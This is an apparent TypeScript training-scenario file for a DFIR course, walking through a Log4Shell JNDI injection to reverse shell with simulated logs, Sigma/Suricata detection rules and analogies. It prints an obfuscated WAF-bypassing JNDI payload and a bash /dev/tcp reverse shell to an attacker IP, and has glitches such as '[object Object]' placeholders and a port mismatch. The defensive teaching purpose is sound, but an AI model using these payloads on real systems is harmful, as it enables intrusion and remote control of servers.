import type { AttackScenario } from '../types';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: AttackScenario = {
  id: 'log4shell-dfir',
  code: 'CVE-2021-44228',
  name: 'Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace)',
  shortSubtitle: 'Network & Web DFIR · Web Access Logs, Rogue LDAP, Java Spawning Bash & Auditd',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview: 'In CVE-2021-44228 (Log4Shell), Apache Log4j2 recursively evaluates JNDI lookup expressions embedded inside logged strings. An attacker injects ${jndi:ldap://...} inside an HTTP header (such as User-Agent). When the Java application logs the request, Log4j performs an outbound LDAP query to the attacker server, downloads a malicious Java bytecode class, and spawns an interactive reverse shell under the java process.',
  specs: [
    { term: 'CVE / MITRE ID', value: 'CVE-2021-44228 · T1190 (Exploit Public-Facing App)' },
    { term: 'VULNERABLE COMPONENT', value: 'org.apache.logging.log4j:log4j-core (2.14.1)' },
    { term: 'LOG SOURCES ANALYZED', value: 'Nginx Access.log, Suricata IDS, Linux Auditd (SYSCALL/EXECVE)' },
    { term: 'PROTOCOLS', value: 'HTTP (8080) → LDAP (1389) → HTTP Class Loader (8888) → TCP Shell (4444)' },
    { term: 'TARGET SERVER', value: 'app-prod-01 (10.20.1.15 · Ubuntu 22.04 LTS)' },
  ],
  nodes: [
    {
      id: 'attacker_scanner',
      label: 'Attacker Exploit Node',
      sublabel: '91.214.124.88',
      role: 'attacker',
      x: 15,
      y: 35,
      details: {
        osOrType: 'External Threat Actor',
        pidOrPort: 'Source IP: 91.214.124.88',
        privilege: 'External Untrusted',
        artifacts: ['Header: X-Api-Version / User-Agent', 'Payload: ${jndi:ldap://91.214.124.88:1389/Basic/Command}'],
        description: 'External attacker dispatching crafted HTTP requests containing obfuscated JNDI lookup strings.' } },
    {
      id: 'nginx_waf',
      label: 'Nginx Reverse Proxy',
      sublabel: '10.20.1.10:443',
      role: 'firewall_siem',
      x: 38,
      y: 48,
      details: {
        osOrType: 'Nginx 1.24 + Access Log',
        pidOrPort: '/var/log/nginx/access.log',
        privilege: 'DMZ Ingress Proxy',
        artifacts: ['GET /api/v1/login HTTP/1.1', 'User-Agent: ${${lower:j}ndi:${lower:l}dap://...}'],
        description: 'Ingress reverse proxy logging the raw HTTP request in access.log before forwarding to the Java backend.' } },
    {
      id: 'spring_java',
      label: 'Spring Boot (Log4j2)',
      sublabel: '10.20.1.15 · PID 1420',
      role: 'server',
      x: 60,
      y: 40,
      details: {
        osOrType: 'Java 11 (log4j-core 2.14.1)',
        pidOrPort: 'PID 1420 (User: tomcat)',
        privilege: 'Service Account (tomcat)',
        artifacts: ['logger.info("Failed login from UA: " + userAgent)', 'JndiLookup.lookup() triggered'],
        description: 'Vulnerable Java microservice whose Log4j2 logger evaluates the JNDI string and initiates an outbound LDAP connection.' } },
    {
      id: 'rogue_ldap',
      label: 'Rogue LDAP & HTTP',
      sublabel: '91.214.124.88:1389',
      role: 'attacker',
      x: 85,
      y: 25,
      details: {
        osOrType: 'JNDIExploit / Marshalsec Server',
        pidOrPort: 'TCP/1389 (LDAP) & TCP/8888 (HTTP)',
        privilege: 'Attacker Infrastructure',
        artifacts: ['javaCodeBase: http://91.214.124.88:8888/', 'javaFactory: Exploit'],
        description: 'Attacker-controlled LDAP referral server directing the victim JVM to load and instantiate Exploit.class over HTTP.' } },
    {
      id: 'auditd_siem',
      label: 'Linux Auditd & SIEM',
      sublabel: 'SYSCALL execve /bin/bash',
      role: 'firewall_siem',
      x: 82,
      y: 72,
      details: {
        osOrType: 'Linux Kernel Auditd + Elastic SIEM',
        pidOrPort: '/var/log/audit/audit.log',
        privilege: 'Root Kernel Telemetry',
        artifacts: ['type=EXECVE a0="/bin/sh" a1="-c" a2="bash -i >& /dev/tcp/..."', 'ppid=1420 (java)'],
        description: 'Linux Audit daemon capturing the exact execve system call where the Java process spawns /bin/sh and establishes a reverse shell.' } },
  ],
  processTree: [
    {
      pid: 1,
      ppid: 0,
      name: 'systemd',
      commandLine: '/sbin/init',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: ['clone'] },
    {
      pid: 1420,
      ppid: 1,
      name: 'java',
      commandLine: '/usr/bin/java -jar /opt/app/billing-service.jar',
      user: 'tomcat',
      integrity: 'Medium',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'org.apache.logging.log4j.core.lookup.JndiLookup',
        'javax.naming.InitialContext.lookup("ldap://91.214.124.88:1389/Exploit")',
        'java.net.URLClassLoader.findClass("Exploit")',
        'java.lang.Runtime.getRuntime().exec()',
      ] },
    {
      pid: 8912,
      ppid: 1420,
      name: '/bin/sh',
      commandLine: '/bin/sh -c bash -i >& /dev/tcp/91.214.124.88/4444 0>&1',
      user: 'tomcat',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 4,
      apiCalls: ['execve("/bin/bash")', 'dup2(sock, 0)', 'dup2(sock, 1)', 'connect(91.214.124.88:4444)'] },
  ],
  stages: [
    {
      index: 1,
      title: 'INJECT JNDI PAYLOAD IN HTTP HEADER',
      subtitle: 'Obfuscated User-Agent bypasses basic WAF signature',
      description: 'The attacker sends an HTTP request carrying `${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}` in the User-Agent header. Nested lookups like `${lower:j}` evade naive string-matching WAF rules. Nginx records the raw request in /var/log/nginx/access.log and forwards it to the Spring Boot backend.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['attacker_scanner', 'nginx_waf', 'spring_java'],
      compromisedNodeIds: ['attacker_scanner'],
      keySpecs: [
        { term: 'INJECTION VECTOR', value: 'HTTP Header: User-Agent / X-Api-Version' },
        { term: 'WAF BYPASS', value: '${${lower:j}ndi:${lower:l}dap://...}' },
        { term: 'LOG ARTIFACT', value: '/var/log/nginx/access.log' },
      ] },
    {
      index: 2,
      title: 'LOG4J JNDI EVALUATION & OUTBOUND LDAP',
      subtitle: 'JndiManager initiates TCP/1389 connection to rogue LDAP',
      description: 'When the Java application logs the request via logger.info(), Log4j2 parses the ${jndi:ldap://...} token and invokes JndiManager.lookup(). The server initiates an outbound TCP connection on port 1389 to 91.214.124.88. In network logs (Zeek/Suricata), an internal web server initiating outbound LDAP to an external IP is a high-fidelity indicator.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1203',
      mitreTechniqueName: 'Exploitation for Client/Server Execution',
      activeNodeIds: ['spring_java', 'rogue_ldap'],
      compromisedNodeIds: ['attacker_scanner', 'spring_java'],
      keySpecs: [
        { term: 'JAVA CLASS', value: 'org.apache.logging.log4j.core.net.JndiManager' },
        { term: 'OUTBOUND CONN', value: '10.20.1.15:49210 → 91.214.124.88:1389 (LDAP)' },
        { term: 'NETWORK ANOMALY', value: 'DMZ Web Server making external LDAP query' },
      ] },
    {
      index: 3,
      title: 'LDAP REFERRAL & REMOTE CLASS LOADING',
      subtitle: 'JVM fetches http://91.214.124.88:8888/Exploit.class',
      description: 'The rogue LDAP server responds with a JNDI Reference entry specifying javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit". The victim JVM automatically issues an HTTP GET request to download Exploit.class (magic bytes 0xCAFEBABE) and executes its static initializer block.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1105',
      mitreTechniqueName: 'Ingress Tool Transfer (Remote Class Load)',
      activeNodeIds: ['spring_java', 'rogue_ldap'],
      compromisedNodeIds: ['attacker_scanner', 'spring_java', 'rogue_ldap'],
      keySpecs: [
        { term: 'LDAP ATTRIBUTE', value: 'javaCodeBase: http://91.214.124.88:8888/' },
        { term: 'STAGE 2 PAYLOAD', value: 'Exploit.class (Java Bytecode 0xCAFEBABE)' },
        { term: 'EXECUTION SINK', value: 'Runtime.getRuntime().exec(String[] cmd)' },
      ] },
    {
      index: 4,
      title: 'JAVA SPAWNS /BIN/BASH REVERSE SHELL',
      subtitle: 'Linux Auditd captures java (PID 1420) spawning /bin/sh',
      description: 'The static block inside Exploit.class invokes Runtime.getRuntime().exec() to spawn a reverse shell to 91.214.124.88:4444. On the host, Linux Auditd (/var/log/audit/audit.log) records a SYSCALL event (syscall=59 execve) showing parent process java (PID 1420) executing /bin/sh.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['spring_java', 'auditd_siem', 'attacker_scanner'],
      compromisedNodeIds: ['attacker_scanner', 'spring_java', 'rogue_ldap'],
      keySpecs: [
        { term: 'LINUX SYSCALL', value: 'syscall=59 (sys_execve) · ppid=1420 (java)' },
        { term: 'SHELL COMMAND', value: 'bash -i >& /dev/tcp/91.214.124.88/4444 0>&1' },
        { term: 'EFFECTIVE USER', value: 'uid=1001(tomcat) gid=1001(tomcat)' },
      ] },
  ],
  telemetry: [
    {
      id: 'l4s-1',
      no: 1,
      stageIndex: 1,
      timestamp: '14:22:01.040',
      sourceNodeId: 'attacker_scanner',
      targetNodeId: 'nginx_waf',
      sourceLabel: '91.214.124.88',
      targetLabel: '10.20.1.10 (Nginx)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'Nginx Access Log',
      shortAction: 'HTTP JNDI',
      info: 'POST /api/v1/login UA="${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}"',
      sizeOrCode: 'HTTP 401',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation: 'The Nginx access.log shows the attacker injecting an obfuscated JNDI expression in the User-Agent header. Even though login failed with HTTP 401, the backend logged the failed attempt along with the User-Agent string, triggering the vulnerability!',
      rawLog: `91.214.124.88 - - [12/Nov/2026:14:22:01 +0000] "POST /api/v1/login HTTP/1.1" 401 142 "-" "\${\${lower:j}ndi:\${lower:l}dap://91.214.124.88:1389/Exploit}" "-"

# Application Log (/var/log/billing-service/app.log):
2026-11-12 14:22:01.045 WARN [http-nio-8080-exec-4] com.corp.auth.LoginController - Failed login attempt for user 'admin' from User-Agent: \${\${lower:j}ndi:\${lower:l}dap://91.214.124.88:1389/Exploit}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Log4Shell Exploitation Attempt in Web Access Logs',
        ruleCode: `title: Log4Shell CVE-2021-44228 Web Log Detection
logsource:
  category: webserver
detection:
  selection:
    cs-user-agent|contains:
      - '\${jndi:'
      - '\${lower:'
      - '\${upper:'
      - ':ldap://'
      - ':rmi://'
  condition: selection
level: critical`,
        mitigation: 'Upgrade Log4j2 to >= 2.17.1, set -Dlog4j2.formatMsgNoLookups=true, and block nested ${...} lookup patterns at the WAF.' } },
    {
      id: 'l4s-2',
      no: 2,
      stageIndex: 2,
      timestamp: '14:22:01.190',
      sourceNodeId: 'spring_java',
      targetNodeId: 'rogue_ldap',
      sourceLabel: '10.20.1.15 (Java)',
      targetLabel: '91.214.124.88:1389',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata / Zeek',
      shortAction: 'LDAP QUERY',
      info: 'LDAP SearchRequest BaseObject="Exploit" Scope=baseObject',
      sizeOrCode: '118 B',
      severity: 'HIGH',
      mitreId: 'T1203',
      explanation: 'Network telemetry confirms the internal server (10.20.1.15) initiated an outbound LDAP SearchRequest to 91.214.124.88:1389. In DFIR triage, outbound LDAP/RMI traffic proves the vulnerability was successfully triggered rather than merely scanned.',
      rawLog: `{
  "timestamp": "2026-11-12T14:22:01.190Z",
  "event_type": "alert",
  "src_ip": "10.20.1.15",
  "src_port": 49210,
  "dest_ip": "91.214.124.88",
  "dest_port": 1389,
  "proto": "TCP",
  "alert": {
    "signature": "ET EXPLOIT Apache Log4j RCE Outbound LDAP SearchRequest",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "ldap": {
    "operation": "SearchRequest",
    "base_object": "Exploit"
  }
}`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Outbound LDAP Connection from DMZ Server',
        ruleCode: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"SOC DFIR Outbound Unencrypted LDAP SearchRequest to Internet";
  flow:established,to_server;
  content:"|30|"; depth:1;
  content:"|63|"; distance:1; within:6;
  classtype:bad-unknown; sid:9001042; rev:1;
)`,
        mitigation: 'Enforce strict Egress Firewall filtering on DMZ application servers to block unauthorized outbound connections.' } },
    {
      id: 'l4s-3',
      no: 3,
      stageIndex: 3,
      timestamp: '14:22:01.410',
      sourceNodeId: 'rogue_ldap',
      targetNodeId: 'spring_java',
      sourceLabel: '91.214.124.88:8888',
      targetLabel: '10.20.1.15 (Java)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP ClassLoad',
      shortAction: 'Exploit.class',
      info: 'HTTP/1.1 200 OK (application/java-vm) -> Magic: 0xCAFEBABE',
      sizeOrCode: '1.8 KB',
      severity: 'CRITICAL',
      mitreId: 'T1105',
      explanation: 'Following the LDAP Reference response, the victim JVM requests http://91.214.124.88:8888/Exploit.class using User-Agent "Java/11.0.11" and loads the returned 0xCAFEBABE bytecode.',
      rawLog: `GET /Exploit.class HTTP/1.1
User-Agent: Java/11.0.11
Host: 91.214.124.88:8888
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 1842

CA FE BA BE 00 00 00 37 00 34 0A 00 0B 00 1C 08  .......7.4......
00 1D 0A 00 1E 00 1F 07 00 20 07 00 21 01 00 06  ......... ..!...
<Decompiled: Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","bash -i >& /dev/tcp/91.214.124.88/4444 0>&1"});>`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Java Bytecode (0xCAFEBABE) Downloaded Over Plain HTTP',
        ruleCode: `alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Java Class Bytecode (CAFEBABE) Downloaded over HTTP";
  flow:established,to_client;
  http.stat_code; content:"200";
  file.data; content:"|CA FE BA BE|"; depth:4;
  classtype:trojan-activity; sid:2034651; rev:2;
)`,
        mitigation: 'Ensure JVM remote classloading is disabled via -Dcom.sun.jndi.ldap.object.trustURLCodebase=false.' } },
    {
      id: 'l4s-4',
      no: 4,
      stageIndex: 4,
      timestamp: '14:22:01.680',
      sourceNodeId: 'spring_java',
      targetNodeId: 'auditd_siem',
      sourceLabel: 'java (PID 1420)',
      targetLabel: '/bin/sh (PID 8912)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd EXECVE',
      shortAction: 'SPAWN /BIN/SH',
      info: 'syscall=59(execve) ppid=1420 exe="/usr/bin/dash" a2="bash -i >& /dev/tcp/..."',
      sizeOrCode: 'PID 8912',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation: 'Linux Auditd (/var/log/audit/audit.log) provides definitive forensic proof of RCE: parent PID 1420 (java) invoked execve() to launch /bin/sh redirecting interactive bash stdio to /dev/tcp/91.214.124.88/4444.',
      rawLog: `type=SYSCALL msg=audit(1794493321.680:4821): arch=c000003e syscall=59 success=yes exit=0 a0=7f8b40112a10 a1=7f8b40112a90 a2=7ffd91a04118 a3=0 items=2 ppid=1420 pid=8912 auid=4294967295 uid=1001 gid=1001 euid=1001 tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/dash" key="java_shell_spawn"
type=EXECVE msg=audit(1794493321.680:4821): argc=3 a0="/bin/sh" a1="-c" a2="bash -i >& /dev/tcp/91.214.124.88/4444 0>&1"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Java Process Spawning Interactive Linux Shell',
        ruleCode: `title: Java Application Spawning Shell Process
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/java'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/zsh'
  condition: selection
level: critical`,
        mitigation: 'Configure Auditd rules on execve for web service UIDs and restrict child process spawning via AppArmor or SELinux profiles.' } },
  ] };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'log4shell-dfir',
    briefing: {
      headline: 'Scenario Briefing: Log4Shell (CVE-2021-44228), From a Single HTTP Log Line to Remote Code Execution',
      storyAnalogy:
        'Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building.',
      plainSummary:
        'In this scenario (CVE-2021-44228, Log4Shell JNDI Injection to Reverse Shell) at 10.20.1, the attacker plants a malicious lookup string so a helpful logger dials out and loads remote code instead of writing plain text. The attack unfolds in one continuous arc: hide a JNDI LDAP lure inside an HTTP header (so the guestbook dials an outside bureau), force Log4j to evaluate that lookup (so the app asks the attacker what to build), follow the LDAP referral to download bytecode (so unsigned instructions enter the JVM), then run the static initializer into a reverse shell (handing the line to the caller). Steps #1–#4 walk that chain end-to-end by covering the poisoned header, outbound LDAP call, remote class load, and shell spawn, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible. Primary detection pivots on Suricata and nginx access-log telemetry across the kill chain.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Attacker Exploit & Scanner 91.214.124.88), follow Step #1 (#1→) through Node ② (Nginx Reverse Proxy 10.20.1.10:443), trace Step #2 (#2→) as Node ③ (Spring Boot App Server app-prod-01 10.20.1.15) queries Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:1389), watch Step #3 (#3→) fetch Exploit.class into Node ④ (java PID 1420 → /bin/sh PID 8912), and follow Step #4 (#4→) spawning the reverse shell to Node ① (91.214.124.88:4444) monitored by Node ⑥ (SOC SIEM & Linux Auditd).',
      documentedAdvisory: 'CISA Alert AA21-356A · NIST NVD CVE-2021-44228 · MITRE ATT&CK T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Sending the "${jndi:ldap://...}" String Inside an HTTP Header & Triggering Logger Evaluation',
        storyAnalogy:
          'The intruder walks up to the front reception desk and hands over a visitor badge whose "X-Api-Version / User-Agent" field contains a secret phone-call instruction instead of a normal browser name.',
        simpleExplanation:
          'The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression, ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} (using nested ${lower:...} tokens to evade basic WAF string filters while still resolving to a JNDI lookup), inside the HTTP User-Agent and X-Api-Version headers (chosen because web servers automatically write these headers into their access and failed-login audit logs). Nginx logs the request and returns HTTP 401 Unauthorized after forwarding it to the Spring Boot backend (10.20.1.15, PID 1420), which immediately passes the unauthenticated request’s User-Agent string into logger.info() (triggering the vulnerability even though the login attempt itself returned 401).',
        howItWorksInPractice:
          'Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info("Failed login from UA: " + userAgent) (recording client metadata for security audit trails). Because Log4j2 v2.0 to 2.14.1 had message pattern lookups enabled by default (designed to resolve variables like ${java:version} inside log lines), logging the rejected HTTP 401 request causes JndiLookup.lookup() inside java (PID 1420) to parse and execute the embedded "${jndi:ldap://...}" expression.',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ① (Attacker Exploit & Scanner 91.214.124.88) to Node ② (Nginx Reverse Proxy 10.20.1.10:443), forwarding GET /api/v1/login into the Java application and returning HTTP 401.',
        detectionAndEvidence:
          'Documented in CISA AA21-356A & Nginx Access Log (/var/log/nginx/access.log) / ModSecurity CRS Rule 944150: GET /api/v1/login returning HTTP 401 with User-Agent containing "${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}". Correlate Sysmon or Windows Security Event telemetry for T1190 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1203',
        plainTitle: 'Log4j Evaluates the Lookup & Connects Out to the Attacker’s Rogue LDAP Server',
        storyAnalogy:
          'As the receptionist writes the visitor’s header into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (91.214.124.88:1389) to ask what to do next.',
        simpleExplanation:
          'Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI, Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI opens an outbound TCP connection from 10.20.1.15:49210 to port 1389 on the attacker’s rogue Marshalsec LDAP server at 91.214.124.88:1389 and sends a 118-byte LDAP SearchRequest for baseObject "Exploit" (forcing the internal web server to reach out across the firewall and ask the attacker’s directory server how to construct the logged object).',
        howItWorksInPractice:
          'JNDI supports pluggable directory protocols including LDAP, RMI, and DNS. Because Log4j2 v2.14.1 placed no domain whitelist on JndiManager.lookup(), an attacker-supplied ldap://91.214.124.88:1389/Exploit URL forces javax.naming.InitialContext.lookup() inside PID 1420 to transmit the outbound LDAP SearchRequest (118 B) and accept the rogue server’s LDAP SearchResultEntry response containing external class-loading attributes. In the documented Suricata / Zeek exchange from DMZ WAF & Reverse Proxy to Java App Server (app-prod-01), Java App Server (app-prod-01) responds with ALERT 118 B (confirming that the LDAP QUERY request succeeded on Java App Server (app-prod-01) and establishing the runtime state required for Step #3 LDAP REFERRAL & REMOTE CLASS LOADING).',
        diagramAlignment:
          'On the diagram, follow Step #2 / Link #2 (#2→ / ⇠#2) from Node ③ (Spring Boot App Server app-prod-01 10.20.1.15) out to Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:1389), returning the LDAP SearchResultEntry referral.',
        detectionAndEvidence:
          'Documented in Suricata IDS (ET EXPLOIT Apache Log4j RCE Outbound LDAP) & Zeek: internal Java server 10.20.1.15:49210 initiating unexpected outbound TCP/1389 LDAP SearchRequest (118 B) to 91.214.124.88:1389.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1105',
        plainTitle: 'LDAP Referral & Downloading Remote "Exploit.class" Bytecode Over HTTP',
        storyAnalogy:
          'The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (javaCodeBase)." The Java server obediently fetches that blueprint and loads it directly into memory.',
        simpleExplanation:
          'The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server that the requested object class is hosted at an external HTTP URL). Obeying those attributes, the JVM (PID 1420 on 10.20.1.15) sends an HTTP GET /Exploit.class request to 91.214.124.88:8888 and receives an HTTP 200 OK response delivering 1.8 KB (1,842 bytes) of compiled Java bytecode (application/java-vm with magic header 0xCAFEBABE, which URLClassLoader.findClass("Exploit") maps directly into JVM memory).',
        howItWorksInPractice:
          'When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to http://91.214.124.88:8888/Exploit.class (allowing the attacker to stream a 1.8 KB compiled Java class over standard HTTP and instantiate it inside PID 1420). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) delivers GET /Exploit.class (HTTP 200 OK · 1.8 KB Java Bytecode) from Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:8888) into Node ④ (java PID 1420 → /bin/sh PID 8912).',
        detectionAndEvidence:
          'Documented in Zeek http.log & Suricata: Java process (10.20.1.15) receiving HTTP 200 OK (1,842 bytes, application/java-vm, CAFEBABE magic header) from http://91.214.124.88:8888/Exploit.class.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1059.004',
        plainTitle: 'Executing the Static Initializer & Spawning a "/bin/sh" Reverse Shell',
        storyAnalogy:
          'The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (static {} block) snaps open and dials a permanent private backdoor phone line (/bin/sh) straight back to the intruder on port 4444.',
        simpleExplanation:
          'The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user).',
        howItWorksInPractice:
          'By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, Step #4 / Link #4 (#4→ / ⇠#4) spawns /bin/sh (PID 8912) inside Node ④ (java PID 1420 → /bin/sh) and connects out to Node ① (91.214.124.88:4444), while Node ⑥ (SOC SIEM & Linux Auditd) logs SYSCALL execve (PID 8912).',
        detectionAndEvidence:
          'Documented in Linux Auditd (SYSCALL 59 execve, pid=8912, ppid=1420, uid=1001 tomcat) & Sigma rule: /usr/bin/java spawning /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1".',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
      briefing: {
        storyAnalogy:
          'A hotel reception clerk writes every guest badge note verbatim into a smart ledger that automatically phones any directory number printed on the paper. A visitor hands over a slip listing an outside phone bureau, so the clerk dials out, fetches an unsigned instruction booklet from a street kiosk, and hands the master phone line to the caller.',
        storyMappings: [
          {
            storyTerm: 'Smart reception ledger',
            technicalTerm: 'Vulnerable Log4j 2 message lookup engine',
            tone: 'amber',
          },
          {
            storyTerm: 'Guest badge note',
            technicalTerm: 'HTTP User-Agent request header',
            tone: 'sky',
          },
          {
            storyTerm: 'Outside phone bureau',
            technicalTerm: 'Attacker-controlled LDAP referral server',
            tone: 'rose',
          },
          {
            storyTerm: 'Unsigned instruction booklet',
            technicalTerm: 'Remote Java bytecode class file',
            tone: 'emerald',
          },
        ],
      },
      steps: {
        1: {
          storyAnalogy:
            'The visitor walks up to the front desk and presents a paper badge note containing a special lookup code instead of a normal guest name. The desk clerk copies the entire line directly into the smart ledger without checking whether the note contains a directory command.',
          storyMappings: [
            {
              storyTerm: 'Front desk counter',
              technicalTerm: 'Public web application login endpoint',
              tone: 'amber',
            },
            {
              storyTerm: 'Paper badge note',
              technicalTerm: 'Crafted User-Agent HTTP header string',
              tone: 'sky',
            },
            {
              storyTerm: 'Special lookup code',
              technicalTerm: 'JNDI lookup expression (CVE-2021-44228)',
              tone: 'rose',
            },
            {
              storyTerm: 'Smart reception ledger',
              technicalTerm: 'Log4j 2 logging library formatter',
              tone: 'emerald',
            },
          ],
        },
        2: {
          storyAnalogy:
            'As soon as the ledger reads the special lookup code, its built-in dialer automatically places an outgoing call through the lobby switchboard to the outside phone bureau printed on the slip.',
          storyMappings: [
            {
              storyTerm: 'Built-in ledger dialer',
              technicalTerm: 'Java Naming and Directory Interface client',
              tone: 'amber',
            },
            {
              storyTerm: 'Lobby switchboard',
              technicalTerm: 'Perimeter egress firewall',
              tone: 'sky',
            },
            {
              storyTerm: 'Outgoing phone call',
              technicalTerm: 'Outbound LDAP connection on TCP port 389',
              tone: 'rose',
            },
            {
              storyTerm: 'Outside phone bureau',
              technicalTerm: 'External rogue directory listener',
              tone: 'emerald',
            },
          ],
        },
        3: {
          storyAnalogy:
            'The outside phone bureau does not give a simple name; instead, it hands back a forwarding slip pointing to a nearby street kiosk. The trusting clerk walks over to that kiosk and carries back an unsigned instruction booklet.',
          storyMappings: [
            {
              storyTerm: 'Forwarding slip',
              technicalTerm: 'LDAP javaCodeBase reference attribute',
              tone: 'amber',
            },
            {
              storyTerm: 'Nearby street kiosk',
              technicalTerm: 'External HTTP payload staging server',
              tone: 'sky',
            },
            {
              storyTerm: 'Unsigned instruction booklet',
              technicalTerm: 'Compiled Exploit.class Java bytecode',
              tone: 'rose',
            },
            {
              storyTerm: 'Trusting desk clerk',
              technicalTerm: 'Application JVM URLClassLoader',
              tone: 'emerald',
            },
          ],
        },
        4: {
          storyAnalogy:
            'The clerk opens the cover page of the instruction booklet, which triggers a built-in setup checklist before any chapter is even read. Following that opening page, the clerk picks up the hotel back-office handset and opens a live private line straight to the outsider.',
          storyMappings: [
            {
              storyTerm: 'Cover page setup checklist',
              technicalTerm: 'Java static initializer block',
              tone: 'amber',
            },
            {
              storyTerm: 'Back-office handset',
              technicalTerm: 'Spawned /bin/sh command interpreter',
              tone: 'sky',
            },
            {
              storyTerm: 'Live private line',
              technicalTerm: 'Outbound interactive reverse session',
              tone: 'rose',
            },
            {
              storyTerm: 'Hotel building staff role',
              technicalTerm: 'Application service user context',
              tone: 'emerald',
            },
          ],
        },
      },
    };
